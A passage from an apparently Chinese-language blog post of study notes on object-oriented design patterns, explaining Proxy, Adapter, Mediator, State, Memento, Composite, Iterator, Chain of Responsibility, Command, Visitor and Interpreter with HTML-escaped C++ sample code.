// ...&#125;;class SubsystemC&#123;public: void suboperation() &#123; std::cout &lt;&lt; \"Subsystem C method\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;/* * Facade * delegates client requests to appropriate subsystem object * and unified interface that is easier to use */class Facade&#123;public: Facade() : subsystemA(), subsystemB(), subsystemC() &#123;&#125; void operation1() &#123; subsystemA-&gt;suboperation(); subsystemB-&gt;suboperation(); // ... &#125; void operation2() &#123; subsystemC-&gt;suboperation(); // ... &#125; // ... private: SubsystemA *subsystemA; SubsystemB *subsystemB; SubsystemC *subsystemC; // ...&#125;;int main()&#123; Facade *facade = new Facade(); facade-&gt;operation1(); facade-&gt;operation2(); delete facade; return 0;&#125; Proxy 在面向对象的系统中，有些对象可能由于，对象创建开销很大、需要额外安全控制、需要进程外的访问操作等，直接访问对象会麻烦。 比如说，加载一个word文档，如果有很多图片，肯定不会希望在打开文件时就完成对所有图片的加载工作，那样会很慢。这时候，可以转化为加载一个图片的proxy代理，当浏览到该图片是，再通过proxy加载相应图片。 Proxy为其他对象提供一种代理以控制对这个对象的访问。 通常Proxy会保持原对象的接口，这个被叫做“透明操作”。但是也不一定完全保持原对象接口。 Proxy可能会作用于一个对象，也可能作用于一个大的系统，实现起来可能会很复杂。 另一个使用场景是对用户隐藏另一种称之为 copy-on-write的优化方式，该优化与根据需要创建对象有关。拷贝一个庞大而复杂的对象是一种开销很大的操作，如果这个拷贝根本没有被修改，那么这些开销就没有必要。用代理延迟这一拷贝过程，我们可以保证只有当这个对象被修改的时候才对它进行拷贝。 在实现 Copy-on-write时必须对实体进行引用计数。拷贝代理仅会增加引用计数。只有当用户请求一个修改该实体的操作时，代理才会真正的拷贝它。在这种情况下，代理还必须减少实体的引用计数。当引用的数目为零时，这个实体将被删除。 Copy-on-Write可以大幅度的降低拷贝庞大实体时的开销。 下面是一些可以使用 Proxy模式常见情况： 远程代理（Remote Proxy）为一个对象在不同的地址空间提供局部代表。 虚代理（Virtual Proxy）根据需要创建开销很大的对象。 保护代理（Protection Proxy）控制对原始对象的访问。保护代理用于对象应该有不同的访问权限的时候。 智能指引 （Smart Reference）取代了简单的指针，它在访问对象时执行一些附加操作。它的典型用途包括： 对指向实际对象的引用计数，这样当该对象没有引用时，可以自动释放它 (也称为 Smart Pointers )。 当第一次引用一个持久对象时，将它装入内存。 在访问一个实际对象前，检查是否已经锁定了它，以确保其他对象不能改变它。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;iostream&gt;/* * Subject * defines the common interface for RealSubject and Proxy * so that a Proxy can be used anywhere a RealSubject is expected */class Subject&#123;public: virtual ~Subject() &#123; /* ... */ &#125; virtual void request() = 0; // ...&#125;;/* * Real Subject * defines the real object that the proxy represents */class RealSubject : public Subject&#123;public: void request() &#123; std::cout &lt;&lt; \"Real Subject request\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Proxy * maintains a reference that lets the proxy access the real subject */class Proxy : public Subject&#123;public: Proxy() &#123; subject = new RealSubject(); &#125; ~Proxy() &#123; delete subject; &#125; void request() &#123; subject-&gt;request(); &#125; // ...private: RealSubject *subject;&#125;;int main()&#123; Proxy *proxy = new Proxy(); proxy-&gt;request(); delete proxy; return 0;&#125; Adapter 在软件系统中，有时会需要将 一些现有的对象 放在新的环境中使用。但是此时的接口发生了变化。 Adapter将一个类的接口转换成客户希望的另外一个接口。 Adapter模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。也被称为Wrapper。 模式表达如下： Adapter继承Target保持了形同接口，同时组合了一个Adaptee对象，可以调用Adaptee的方法。 抽象代码结构 使用多继承的方式，类adapter。但是依然推荐组合而不是继承。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;/* * Target * defines specific interface that Client uses */class Target&#123;public: virtual ~Target() &#123;&#125; virtual void request() = 0; // ...&#125;;/* * Adaptee * defines an existing interface that needs adapting and thanks * to Adapter it will get calls that client makes on the Target * */class Adaptee&#123;public: void specificRequest() &#123; std::cout &lt;&lt; \"specific request\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Adapter * implements the Target interface and when it gets a method call it * delegates the call to a Adaptee */class Adapter : public Target&#123;public: Adapter() : adaptee() &#123;&#125; ~Adapter() &#123; delete adaptee; &#125; void request() &#123; adaptee-&gt;specificRequest(); // ... &#125; // ...private: Adaptee *adaptee; // ...&#125;;int main()&#123; Target *t = new Adapter(); t-&gt;request(); delete t; return 0;&#125; 使用组合对象，对象adapter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;/* * Target * defines specific interface that Client uses */class Target&#123;public: virtual ~Target() &#123;&#125; virtual void request() = 0; // ...&#125;;/* * Adaptee * all requests get delegated to the Adaptee which defines * an existing interface that needs adapting */class Adaptee&#123;public: ~Adaptee() &#123;&#125; void specificRequest() &#123; std::cout &lt;&lt; \"specific request\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Adapter * implements the Target interface and lets the Adaptee respond * to request on a Target by extending both classes * ie adapts the interface of Adaptee to the Target interface */class Adapter : public Target, private Adaptee&#123;public: virtual void request() &#123; specificRequest(); &#125; // ...&#125;;int main()&#123; Target *t = new Adapter(); t-&gt;request(); delete t; return 0;&#125; Mediator 处理多个对象相互关联，并且其引用关系复杂，使得改变变得不那么容易。 Mediator用一个中介对象来封装一系列的对象交互。中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。 和Facade很相似，但是Mediator是作用于内部对象之间的，双向的关系。Facade是解耦内部对象和外部环境的，单向的关系。 图中忽略了Mediator与Colleagu之间的通信实现，这个往往是复杂的。其中可以用到Observer模式，来自动检测不同对象间的通信转换。 Mediator中有Colleague的指针成员，Colleague中有Mediator的指针成员。方便两者之间的相互调用。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;class Mediator;/* * Colleague classes * each colleague communicates with its mediator whenever * it would have otherwise communicated with another colleague */class Colleague&#123;public: Colleague( Mediator* const m, const unsigned int i ) : mediator( m ), id( i ) &#123;&#125; virtual ~Colleague() &#123;&#125; unsigned int getID() &#123; return id; &#125; virtual void send( std::string ) = 0; virtual void receive( std::string ) = 0;protected: Mediator *mediator; unsigned int id;&#125;;class ConcreteColleague : public Colleague&#123;public: ConcreteColleague( Mediator* const m, const unsigned int i ) : Colleague( m, i ) &#123;&#125; ~ConcreteColleague() &#123;&#125; void send( std::string msg ); void receive( std::string msg ) &#123; std::cout &lt;&lt; \"Message '\" &lt;&lt; msg &lt;&lt; \"' received by Colleague \" &lt;&lt; id &lt;&lt; std::endl; &#125;&#125;;/* * Mediator * defines an interface for communicating with Colleague objects */class Mediator&#123;public: virtual ~Mediator() &#123;&#125; virtual void add( Colleague* const c ) = 0; virtual void distribute( Colleague* const sender, std::string msg ) = 0;protected: Mediator() &#123;&#125;&#125;;/* * Concrete Mediator * implements cooperative behavior by coordinating Colleague objects * and knows its colleagues */class ConcreteMediator : public Mediator&#123;public: ~ConcreteMediator() &#123; for ( unsigned int i = 0; i &lt; colleagues.size(); i++ ) &#123; delete colleagues[ i ]; &#125; colleagues.clear(); &#125; void add( Colleague* const c ) &#123; colleagues.push_back( c ); &#125; void distribute( Colleague* const sender, std::string msg ) &#123; for ( unsigned int i = 0; i &lt; colleagues.size(); i++ ) &#123; if ( colleagues.at( i )-&gt;getID() != sender-&gt;getID() ) &#123; colleagues.at( i )-&gt;receive( msg ); &#125; &#125; &#125;private: std::vector&lt;Colleague*&gt; colleagues;&#125;;void ConcreteColleague::send( std::string msg )&#123; std::cout &lt;&lt; \"Message '\"&lt;&lt; msg &lt;&lt; \"' sent by Colleague \" &lt;&lt; id &lt;&lt; std::endl; mediator-&gt;distribute( this, msg );&#125;int main()&#123; Mediator *mediator = new ConcreteMediator(); Colleague *c1 = new ConcreteColleague( mediator, 1 ); Colleague *c2 = new ConcreteColleague( mediator, 2 ); Colleague *c3 = new ConcreteColleague( mediator, 3 ); mediator-&gt;add( c1 ); mediator-&gt;add( c2 ); mediator-&gt;add( c3 ); c1-&gt;send( \"Hi!\" ); c3-&gt;send( \"Hello!\" ); delete mediator; return 0;&#125; 状态变化相关模式 关注对象状态的改变，对这些 变化的状态进行管理，维持更高层模块的稳定。 典型模式： State Memento State 某些对象的状态如果发生改变，那么它的行为也会发生改变。比如文件的读写状态变化。 State模式允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。 类似Strategy模式，但是这里关注状态的变化。 示例1 实现对网络连接状态的跟踪和处理。 实现一，使用条件判断，处理和转换状态。 12345678910111213141516171819202122enum NetworkState &#123; Network_Open, Network_Close, Network_Connect,&#125;;class NetworkProcessor&#123; NetworkState state;public: void Operation()&#123; if (state == Network_Open)&#123; ... state = Network_Close; &#125; else if (state == Network_Close)&#123; ... state = Network_Connect; &#125; else if (state == Network_Connect)&#123; ... state = Network_Open; &#125; &#125;&#125;; 实现二，抽象出状态对象，状态对象自己处理自己的转换关系。 12345678910111213141516171819202122232425262728293031323334353637383940414243// 状态对象基类class NetworkState&#123;public: NetworkState* pNext; virtual void Operation1()=0; virtual void Operation2()=0; virtual void Operation3()=0; virtual ~NetworkState()&#123;&#125;&#125;;// 具体状态对象，可设计为Singletonclass OpenState :public NetworkState&#123; static NetworkState* m_instance;public: static NetworkState* getInstance()&#123; if (m_instance == nullptr) &#123; m_instance = new OpenState(); &#125; return m_instance; &#125; // 改变 pNext 指针，抽象转换对象状态。 void Operation1()&#123; ... pNext = CloseState::getInstance(); &#125; void Operation2()&#123; ... pNext = ConnectState::getInstance(); &#125; void Operation3()&#123; ... pNext = OpenState::getInstance(); &#125;&#125;;// 更多的具体状态对象，可扩展class CloseState:public NetworkState&#123; ... &#125;... 12345678910111213141516171819202122232425// 应用类，稳定，一般可保持不变class NetworkProcessor&#123; NetworkState* pState; public: NetworkProcessor(NetworkState* pState)&#123; this-&gt;pState = pState; &#125; // 通过 状态对象 处理状态转换 void Operation1()&#123; pState-&gt;Operation1(); pState = pState-&gt;pNext; &#125; void Operation2()&#123; pState-&gt;Operation2(); pState = pState-&gt;pNext; &#125; void Operation3()&#123; pState-&gt;Operation3(); pState = pState-&gt;pNext; &#125;&#125;; State模式将状态的改变，实现为状态对象的改变，通过抽象基类，不再依赖具体对象。而且，状态的转换更加明确，不易出错。 抽象代码结构 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;/* * State * defines an interface for encapsulating the behavior associated * with a particular state of the Context */class State&#123;public: virtual ~State() &#123; /* ... */ &#125; virtual void handle() = 0; // ...&#125;;/* * Concrete States * each subclass implements a behavior associated with a state * of the Context */class ConcreteStateA : public State&#123;public: ~ConcreteStateA() &#123; /* ... */ &#125; void handle() &#123; std::cout &lt;&lt; \"State A handled.\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteStateB : public State&#123;public: ~ConcreteStateB() &#123; /* ... */ &#125; void handle() &#123; std::cout &lt;&lt; \"State B handled.\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Context * defines the interface of interest to clients */class Context&#123;public: Context() : state() &#123; /* ... */ &#125; ~Context() &#123; delete state; &#125; void setState( State* const s ) &#123; if ( state ) &#123; delete state; &#125; state = s; &#125; void request() &#123; state-&gt;handle(); &#125; // ...private: State *state; // ...&#125;;int main()&#123; Context *context = new Context(); context-&gt;setState( new ConcreteStateA() ); context-&gt;request(); context-&gt;setState( new ConcreteStateB() ); context-&gt;request(); delete context; return 0;&#125; Memento 当一个对象，需要保存一个或者多个内存快照，用于未来恢复到当前对象状态。这时，会出现一个潜在问题，对象的实现细节可能会暴露。 Memento的想法，就是找另一个封闭的对象B，保存当前对象A的状态，并在需要的时候用于恢复对象A的状态。 Memento在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。这样以后就可将该对象恢复到原先保存的状态。 这个模式就是为了隐藏对象信息，而不是显示地将一个一个成员变量导出保存。 但是，这个模式实现地内存快照方法，已经过时了，现在往往会采用效率更高、更简洁地序列化方法来实现。 抽象代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;iostream&gt;#include &lt;vector&gt;/* * Memento * stores internal state of the Originator object and protects * against access by objects other than the originator */class Memento&#123;private: // accessible only to Originator friend class Originator; Memento( const int s ) : state( s ) &#123;&#125; void setState( const int s ) &#123; state = s; &#125; int getState() &#123; return state; &#125; // ...private: int state; // ...&#125;;/* * Originator * creates a memento containing a snapshot of its current internal * state and uses the memento to restore its internal state */class Originator&#123;public: // implemented only for printing purpose void setState( const int s ) &#123; std::cout &lt;&lt; \"Set state to \" &lt;&lt; s &lt;&lt; \".\" &lt;&lt; std::endl; state = s; &#125; // implemented only for printing purpose int getState() &#123; return state; &#125; void setMemento( Memento* const m ) &#123; state = m-&gt;getState(); &#125; Memento *createMemento() &#123; return new Memento( state ); &#125;private: int state; // ...&#125;;/* * CareTaker * is responsible for the memento's safe keeping */class CareTaker&#123;public: CareTaker( Originator* const o ) : originator( o ) &#123;&#125; ~CareTaker() &#123; for ( unsigned int i = 0; i &lt; history.size(); i++ ) &#123; delete history.at( i ); &#125; history.clear(); &#125; void save() &#123; std::cout &lt;&lt; \"Save state.\" &lt;&lt; std::endl; history.push_back( originator-&gt;createMemento() ); &#125; void undo() &#123; if ( history.empty() ) &#123; std::cout &lt;&lt; \"Unable to undo state.\" &lt;&lt; std::endl; return; &#125; Memento *m = history.back(); originator-&gt;setMemento( m ); std::cout &lt;&lt; \"Undo state.\" &lt;&lt; std::endl; history.pop_back(); delete m; &#125; // ...private: Originator *originator; std::vector&lt;Memento*&gt; history; // ...&#125;;int main()&#123; Originator *originator = new Originator(); CareTaker *caretaker = new CareTaker( originator ); originator-&gt;setState( 1 ); caretaker-&gt;save(); originator-&gt;setState( 2 ); caretaker-&gt;save(); originator-&gt;setState( 3 ); caretaker-&gt;undo(); std::cout &lt;&lt; \"Actual state is \" &lt;&lt; originator-&gt;getState() &lt;&lt; \".\" &lt;&lt; std::endl; delete originator; delete caretaker; return 0;&#125; 数据结构相关模式 假如存在一些数据结构，如果让客户程序直接依赖它们，会破坏组件的复用性。比如说接口的不统一，导致源代码需要频繁改变。 这时候，对这些数据结构进行封装，对外提供统一的接口，来实现与数据结构无关的访问。 典型模式： Composite Iterator Chain of Responsibility Composite 处理对内部数据结构复杂实现的依赖，Composite将对象组合成树形结构以表示“部分-整体”的层次结构。 Composite使得用户对单个对象和组合对象的使用具有一致性。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;iostream&gt;#include &lt;vector&gt;/* * Component * defines an interface for all objects in the composition * both the composite and the leaf nodes */class Component&#123;public: virtual ~Component() &#123;&#125; virtual Component *getChild( int ) &#123; return 0; &#125; virtual void add( Component * ) &#123; /* ... */ &#125; virtual void remove( int ) &#123; /* ... */ &#125; virtual void operation() = 0;&#125;;/* * Composite * defines behavior of the components having children * and store child components */class Composite : public Component&#123;public: ~Composite() &#123; for ( unsigned int i = 0; i &lt; children.size(); i++ ) &#123; delete children[ i ]; &#125; &#125; Component *getChild( const unsigned int index ) &#123; return children[ index ]; &#125; void add( Component *component ) &#123; children.push_back( component ); &#125; void remove( const unsigned int index ) &#123; Component *child = children[ index ]; children.erase( children.begin() + index ); delete child; &#125; void operation() &#123; for ( unsigned int i = 0; i &lt; children.size(); i++ ) &#123; children[ i ]-&gt;operation(); &#125; &#125; private: std::vector&lt;Component*&gt; children;&#125;;/* * Leaf * defines the behavior for the elements in the composition, * it has no children */class Leaf : public Component&#123;public: Leaf( const int i ) : id( i ) &#123;&#125; ~Leaf() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Leaf \"&lt;&lt; id &lt;&lt;\" operation\" &lt;&lt; std::endl; &#125;private: int id;&#125;;int main()&#123; Composite composite; for ( unsigned int i = 0; i &lt; 5; i++ ) &#123; composite.add( new Leaf( i ) ); &#125; composite.remove( 0 ); composite.operation(); return 0;&#125; Composite的operation()中处理到了Composite类型对象，会继续处理其children。 典型的 Composite对象结构如下图： Iterator 不管内部的数据结构如何定义，Iterator使用统一接口，隐藏内部实现，供外部使用各种数据结构。 Iterator提供一种方法顺序访问一个聚合对象中各个元素 , 而又不需暴露该对象的内部表示。 这个模式在C++中，并不是实现目的的最优选择。STL中泛型编程实现的Iterator比面向对象设计模式实现的Iterator，更高效。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#include &lt;iostream&gt;#include &lt;stdexcept&gt;#include &lt;vector&gt;class Iterator;class ConcreteAggregate;/* * Aggregate * defines an interface for aggregates and it decouples your * client from the implementation of your collection of objects */class Aggregate&#123;public: virtual ~Aggregate() &#123;&#125; virtual Iterator *createIterator() = 0; // ...&#125;;/* * Concrete Aggregate * has a collection of objects and implements the method * that returns an Iterator for its collection * */class ConcreteAggregate : public Aggregate&#123;public: ConcreteAggregate( const unsigned int size ) &#123; list = new int[size](); count = size; &#125; ~ConcreteAggregate() &#123; delete[] list; &#125; Iterator *createIterator(); unsigned int size() const &#123; return count; &#125; int at( unsigned int index ) &#123; return list[ index ]; &#125; // ...private: int *list; unsigned int count; // ...&#125;;/* * Iterator * provides the interface that all iterators must implement and * a set of methods for traversing over elements */class Iterator&#123;public: virtual ~Iterator() &#123; /* ... */ &#125; virtual void first() = 0; virtual void next() = 0; virtual bool isDone() const = 0; virtual int currentItem() const = 0; // ...&#125;;/* * Concrete Iterator * implements the interface and is responsible for managing * the current position of the iterator */class ConcreteIterator : public Iterator&#123;public: ConcreteIterator( ConcreteAggregate *l ) : list( l ), index( 0 ) &#123;&#125; ~ConcreteIterator() &#123;&#125; void first() &#123; index = 0; &#125; void next() &#123; index++; &#125; bool isDone() const &#123; return ( index &gt;= list-&gt;size() ); &#125; int currentItem() const &#123; if ( isDone() ) &#123; return -1; &#125; return list-&gt;at(index); &#125; // ...private: ConcreteAggregate *list; unsigned int index; // ...&#125;;Iterator *ConcreteAggregate::createIterator()&#123; return new ConcreteIterator( this );&#125;int main()&#123; unsigned int size = 5; ConcreteAggregate list = ConcreteAggregate( size ); Iterator *it = list.createIterator(); for ( ; !it-&gt;isDone(); it-&gt;next()) &#123; std::cout &lt;&lt; \"Item value: \" &lt;&lt; it-&gt;currentItem() &lt;&lt; std::endl; &#125; delete it; return 0;&#125; 面向对象的Iterator，相比STL的Iterator，其代价在于ConcreteIterator这种子类调用虚函数的代价。 这种通过虚函数实现多态调用的方法，是运行时多态。 STL通过模板支持不同的数据结构，是编译时多态，由编译器直接推断出具体类型。显然，就程序运行时效率而言，泛型编程的方式效率会更高。 然而在一些不支持泛型编程的语言种，Iterator设计模式还是有应用的。 Chain of Responsibility 当一个请求可以被多个对象处理，但是每次仅会有一个对象完成处理操作，此时，如果显示的一种情况一种情况地去指定处理对象，那么实现会很复杂。 Chain of Responsibility使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。 一个链表中所有对象，依次处理一个请求。最后没有被处理的请求，应当设置默认的响应机制。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;iostream&gt;/* * Handler * defines an interface for handling requests and * optionally implements the successor link */class Handler&#123;public: virtual ~Handler() &#123;&#125; virtual void setHandler( Handler *s ) &#123; successor = s; &#125; virtual void handleRequest() &#123; if (successor != 0) &#123; successor-&gt;handleRequest(); &#125; &#125; // ...private: // 相当于链表的next指针 Handler *successor;&#125;;/* * Concrete Handlers * handle requests they are responsible for */class ConcreteHandler1 : public Handler&#123;public: ~ConcreteHandler1() &#123;&#125; bool canHandle() &#123; // ... return false; &#125; virtual void handleRequest() &#123; if ( canHandle() ) &#123; std::cout &lt;&lt; \"Handled by Concrete Handler 1\" &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; \"Cannot be handled by Handler 1\" &lt;&lt; std::endl; Handler::handleRequest(); &#125; // ... &#125; // ...&#125;;class ConcreteHandler2 : public Handler&#123;public: ~ConcreteHandler2() &#123;&#125; bool canHandle() &#123; // ... return true; &#125; virtual void handleRequest() &#123; if ( canHandle() ) &#123; std::cout &lt;&lt; \"Handled by Handler 2\" &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; \"Cannot be handled by Handler 2\" &lt;&lt; std::endl; Handler::handleRequest(); &#125; // ... &#125; // ...&#125;;int main()&#123; ConcreteHandler1 handler1; ConcreteHandler2 handler2; // 设置链式处理顺序 handler1.setHandler( &amp;handler2 ); handler1.handleRequest(); return 0;&#125; 行为变化相关模式 在组件构建过程中，组件行为会发生变化，并且因此导致组件不得不重新实现。行为一般就是具体的成员方法实现。 行为变化相关模式，就是将组件的行为和组件自身进行解耦。分隔出变化的行为部分。 典型模式： Command Visitor Command 将行为抽象为对象，有点类似C++的函数对象。 Command模式将一个请求封装为一个对象，从而使你可用不同的请求对客户进行参数化；对请求（此时是一个可储存的对象）排队或记录请求日志，以及支持可撤消的操作。 Command模式也被称为动作( Action )或事务( Transaction )模式。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;iostream&gt;/* * Receiver * knows how to perform the operations associated * with carrying out a request */class Receiver&#123;public: void action() &#123; std::cout &lt;&lt; \"Receiver: execute action\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Command * declares an interface for all commands */class Command&#123;public: virtual ~Command() &#123;&#125; virtual void execute() = 0; // ...protected: Command() &#123;&#125;&#125;;/* * Concrete Command * implements execute by invoking the corresponding * operation(s) on Receiver */class ConcreteCommand : public Command&#123;public: ConcreteCommand( Receiver *r ) : receiver( r ) &#123;&#125; ~ConcreteCommand() &#123; if ( receiver ) &#123; delete receiver; &#125; &#125; void execute() &#123; receiver-&gt;action(); &#125; // ... private: Receiver *receiver; // ...&#125;;/* * Invoker * asks the command to carry out the request */class Invoker&#123;public: void set( Command *c ) &#123; command = c; &#125; void confirm() &#123; if ( command ) &#123; command-&gt;execute(); &#125; &#125; // ...private: Command *command; // 可以设置为多个command的容器 // ...&#125;;int main()&#123; ConcreteCommand command( new Receiver() ); Invoker invoker; invoker.set( &amp;command ); invoker.confirm(); return 0;&#125; Command模式有点类似C++的函数对象，但是两者也有明显不同。 面向对象的Command模式对于接口的定义更加规范灵活，但是性能会低一些。C++函数对象加上模板，是通过函数签名来定义接口，另外运行时性能会更高一些。 在不能使用模板和函数对象的语言中，Command模式会比较常见一些。 Visitor 在某些层次结构的类中，比如一个抽象父类下有多个子类，如果需要增加一个新的方法到所有子类中，直接从基类开始修改的话，无疑会很麻烦，而且不符合对修改封闭的设计原则。 Visitor模式表示一个作用于某对象结构中的各元素的操作。它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作。 使用Visitor类来修改原来的类中的方法。 比如以下代码 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;class Element&#123;public: virtual void Func1() = 0; virtual void Func2(int data)=0; //新增方法 virtual void Func3(int data)=0; virtual ~Element()&#123;&#125;&#125;;class ElementA : public Element &#123;public: void Func1() override&#123;...&#125; void Func2(int data) override&#123;...&#125; // 需要新增方法&#125;;class ElementB : public Element&#123;public: void Func1() override&#123;...&#125; void Func2(int data) override &#123;...&#125; // 需要新增方法&#125;; 新增方法3，需要更改所有Element类。 使用Visitor模式，结构如下： 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;class Element&#123;public: virtual void accept(Visitor&amp; visitor) = 0; //第一次多态辨析 virtual ~Element()&#123;&#125;&#125;;class ElementA : public Element&#123;public: void accept(Visitor &amp;visitor) override &#123; visitor.visitElementA(*this); &#125; ...&#125;;class ElementB : public Element&#123;public: void accept(Visitor &amp;visitor) override &#123; visitor.visitElementB(*this); //第二次多态辨析 &#125; ...&#125;;class Visitor&#123;public: virtual void visitElementA(ElementA&amp; element) = 0; virtual void visitElementB(ElementB&amp; element) = 0; virtual ~Visitor()&#123;&#125;&#125;; 1234567891011121314151617181920212223242526272829303132333435//扩展方法，通过visitElementA、visitElementB实现class Visitor1 : public Visitor&#123;public: void visitElementA(ElementA&amp; element) override&#123; cout &lt;&lt; \"Visitor1 is processing ElementA\" &lt;&lt; endl; &#125; void visitElementB(ElementB&amp; element) override&#123; cout &lt;&lt; \"Visitor1 is processing ElementB\" &lt;&lt; endl; &#125;&#125;;//扩展另一种方法class Visitor2 : public Visitor&#123;public: void visitElementA(ElementA&amp; element) override&#123; cout &lt;&lt; \"Visitor2 is processing ElementA 2\" &lt;&lt; endl; &#125; void visitElementB(ElementB&amp; element) override&#123; cout &lt;&lt; \"Visitor2 is processing ElementB 2\" &lt;&lt; endl; &#125;&#125;;int main() &#123; Visitor2 visitor; ElementB elementB; elementB.accept(visitor); ElementA elementA; elementA.accept(visitor); return 0;&#125; 使用Visitor模式之后，只需要扩展新的Visitor子类，就能增加新的方法。 这个过程中，有一种被称为 double dispatch 的实现方法。第一次 dispatch ，Element类中的accept方法，辨析时哪一个扩展的Visitor子类。第二次 dispatch ，accept方法内visitor的成员方法visitElementX方法，辨析当前类是哪一种Element子类。 Visitor模式的使用有一个严格的条件，Element子类的数目必须是已知的，且不会发生变化。否则，整个过程将不再稳定，Visitor模式不如不用。 领域规则相关模式 在特定领域中，可以将变化模式抽象为一些规则，将这些规则通过设计语法实现，就能解决一般性的问题。 典型模式： Interpreter Interpreter 如果在软件构建过程中，某些结构不断地重复出现。构建一种规则，使得问题可以被表达，并通过一个解释器，来解释还原这个表达。 Interpreter模式给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子。 定义比较抽象。举例来说，实现一个加减法表达式运算，可以抽向出加法运算文法地类、减法运算文法地类等，实现一个解释器完成加减运算优先级的处理，调用不同的文法处理操作数。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;iostream&gt;#include &lt;map&gt;/* * Context * contains information that's global to the interpreter */class Context&#123;public: void set( const std::string&amp; var, const bool value) &#123; vars.insert( std::pair&lt;std::string, bool&gt;( var, value ) ); &#125; bool get( const std::string&amp; exp ) &#123; return vars[ exp ]; &#125; // ...private: std::map&lt;std::string, bool&gt; vars; // ...&#125;;/* * Abstract Expression * declares an abstract Interpret operation that is common to all nodes * in the abstract syntax tree */class AbstractExpression&#123;public: virtual ~AbstractExpression() &#123;&#125; virtual bool interpret( Context* const ) &#123; return false; &#125; // ...&#125;;/* * Terminal Expression * implements an Interpret operation associated with terminal symbols * in the grammar (an instance is required for every terminal symbol * in a sentence) */class TerminalExpression : public AbstractExpression&#123;public: TerminalExpression( const std::string&amp; val ) : value( val ) &#123;&#125; ~TerminalExpression() &#123;&#125; bool interpret( Context* const context ) &#123; return context-&gt;get( value ); &#125; // ... private: std::string value; // ...&#125;;/* * Nonterminal Expression * implements an Interpret operation for nonterminal symbols * in the grammar (one such class is required for every rule in the grammar) */class NonterminalExpression : public AbstractExpression&#123;public: NonterminalExpression( AbstractExpression *left, AbstractExpression *right ) : lop( left ), rop( right ) &#123;&#125; ~NonterminalExpression() &#123; delete lop; delete rop; &#125; bool interpret( Context *const context ) &#123; return lop-&gt;interpret( context ) &amp;&amp; rop-&gt;interpret( context ); &#125; // ... private: AbstractExpression *lop; AbstractExpression *rop; // ...&#125;;int main()&#123; // An example of very simple expression tree // that corresponds to expression (A AND B) AbstractExpression *A = new TerminalExpression(\"A\"); AbstractExpression *B = new TerminalExpression(\"B\"); AbstractExpression *exp = new NonterminalExpression( A, B ); Context context; context.set( \"A\", true ); context.set( \"B\", false ); std::cout &lt;&lt; context.get( \"A\" ) &lt;&lt; \" AND \" &lt;&lt; context.get( \"B\" ); std::cout &lt;&lt; \" = \" &lt;&lt; exp-&gt;interpret( &amp;context ) &lt;&lt; std::endl; delete exp; return 0;&#125; 实现这个模式挺复杂的，处理一些简单情况还行。太复杂的情况，面向对象的方式本身代价也比较大，此时可以考虑使用一些语法分析生成器标准工具。 设计模式小结 设计模式的目标是，提高复用性，管理分离变化的部分。所以，对复用性没有要求的时候，设计模式也没那么必要。 什么时候不用模式？代码可读性很差时，不用模式。需求理解不充分时，不用模式。程序中变化的部分没有显现时，不用模式。不是系统的关键依赖点的地方，不用模式。项目没有复用价值时，不用模式。项目将要发布时，不用模式。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Design Patterns","slug":"Notes/Design-Patterns","permalink":"https://racleray.github.io/categories/Notes/Design-Patterns/"}],"tags":[{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"},{"name":"design 